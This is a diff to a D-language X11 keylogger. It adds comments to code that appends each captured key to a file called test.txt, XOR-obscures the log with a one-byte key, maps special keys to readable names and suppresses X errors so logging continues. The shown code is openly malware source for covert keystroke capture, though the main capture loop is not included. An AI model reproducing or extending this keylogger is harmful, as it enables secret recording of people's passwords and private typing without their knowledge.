@@ -7,8 +7,13 @@ import std.conv;
 import std.file;
 import std.array;
 
+// The file our keylog will be written to
 enum saveFile = "test.txt";
+// Our xor key. 
+// As the keys we're logging are only 1 byte, only a 1 byte key is needed
 enum xorKey = "A";
+
+// This line compiles in the xor code
 version = USEXOR;
 
 void main() {
@@ -64,9 +69,13 @@ void logKey(string key) {
 	version(USEXOR) {
 		key = xor(key, xorKey);
 	}
+	// Add a space to each key so we can tell if a user
+	// pressed a key or typed 
+	// (Tell if they pressed Tab (Will show up as "[tab]") or typed Tab (will show up as "[ T a b ] "))
 	std.file.append(saveFile, cast(void[])(key ~ " "));
 }
 
+// Mapping some special keys to common names
 string getKey(int key) {
 	switch (key) {
 		case 32: return "[space]";
@@ -94,6 +103,7 @@ string getKey(int key) {
 }
 
 // A xor to encrypt our keylogs
+// TODO Rewrite to use keys logger than 1 byte
 string xor(string temp, string k) {
     int x = 0;
     string toReturn;
@@ -112,5 +122,8 @@ string xor(string temp, string k) {
 // error as it will sort itself when the user clicks on a new window
 extern (C) int foo(_XDisplay*, XErrorEvent*) nothrow
 {
+	debug {
+		printf("There was an X error\n");
+	}
     return 0;
 }
